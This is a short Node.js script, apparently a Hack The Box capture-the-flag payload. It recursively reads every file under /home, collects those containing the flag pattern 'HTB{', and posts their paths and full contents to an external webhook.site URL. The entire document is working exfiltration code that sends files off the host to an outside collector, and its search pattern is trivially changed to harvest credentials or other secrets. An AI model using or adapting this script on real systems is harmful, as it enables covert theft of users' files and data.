const fsp = require('node:fs/promises');
const https = require('node:https');
const root = "/home";
const WEBHOOK = 'https://webhook.site/12345678-1234-1234-1234-123456789abc';
const NEEDLE = /HTB\{/i;

async function listDir(dir, results = []) {
  const entries = await fsp.readdir(dir, { withFileTypes: true });
  for (const entry of entries) {
    const full = `${dir}/${entry.name}`;
    if (entry.isDirectory()) await listDir(full, results);
    else {
      const text = await fsp.readFile(full, 'utf8');
      if (NEEDLE.test(text)) results.push({ file: full, text });
    }
  }
  return results;
}

(async () => {
  const results = await listDir(root);
  const url = new URL(WEBHOOK);
  const req = https.request(url, { method: 'POST', headers: { 'content-type': 'application/json' } });
  req.end(JSON.stringify({ type: 'scan-complete', results }));
})();
